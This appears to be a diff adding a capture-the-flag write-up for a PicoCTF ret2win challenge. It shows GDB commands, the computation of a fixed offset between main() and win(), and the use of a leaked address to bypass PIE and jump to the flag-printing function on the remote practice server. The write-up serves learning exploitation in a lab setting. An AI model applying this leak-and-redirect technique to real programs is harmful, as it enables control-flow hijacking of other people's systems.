@@ -1,0 +1,86 @@
+Solution Walkthrough: PicoCTF Binary Exploitation Challenge
+Challenge Overview
+
+This is a ret2win (return to win) style challenge where we need to jump to a hidden win() function that prints the flag. The program asks for a memory address and calls whatever address we provide!
+Step 1: Initial Analysis
+
+First, let's examine the binary:
+bash
+
+cd Downloads
+chmod +x vuln  # Make it executable
+
+Step 2: Find the win() Function Address
+
+Using GDB to disassemble the binary:
+bash
+
+gdb vuln
+(gdb) run
+
+The program reveals:
+text
+
+Address of main: 0x55555555533d
+
+Then examine both functions:
+bash
+
+(gdb) disas main     # Shows main function at 0x55555555533d
+(gdb) disas win      # Shows win function at 0x5555555552a7
+
+Step 3: Calculate the Offset
+
+We need to find the relationship between main and win addresses:
+python
+
+# In Python
+>>> 0x000055555555533d - 0x00005555555552a7
+150
+
+This tells us that win is 150 bytes before main in memory.
+Step 4: Understanding ASLR/PIE
+
+Notice that when we run the program, the addresses change each time:
+
+    In GDB: main at 0x55555555533d
+
+    In the remote connection: main at 0x622d4497933d
+
+This is PIE (Position Independent Executable) - the binary loads at different base addresses each time. However, the offset between functions remains constant (150 bytes)!
+Step 5: Calculate the win() Address for Remote Connection
+
+When connecting remotely:
+bash
+
+nc rescued-float.picoctf.net 55340
+Address of main: 0x622d4497933d
+
+Calculate win address:
+python
+
+# win = main - 150 (0x96 in hex)
+0x622d4497933d - 150 = 0x622d449792a7
+
+Step 6: Exploit the Vulnerability
+
+The program has a clear vulnerability - it calls whatever address we give it:
+c
+
+// From vuln.c (implied by behavior)
+scanf("%lx", &addr);  // Reads hex address
+((void(*)())addr)();  // Calls that address as a function!
+
+Simply input the calculated address:
+text
+
+Enter the address to jump to, ex => 0x12345: 0x622d449792a7
+
+Step 7: Get the Flag!
+
+After inputting the correct address, the program jumps to win() which opens and prints flag.txt:
+text
+
+Your input: 622d449792a7
+You won!
+picoCTF{...}
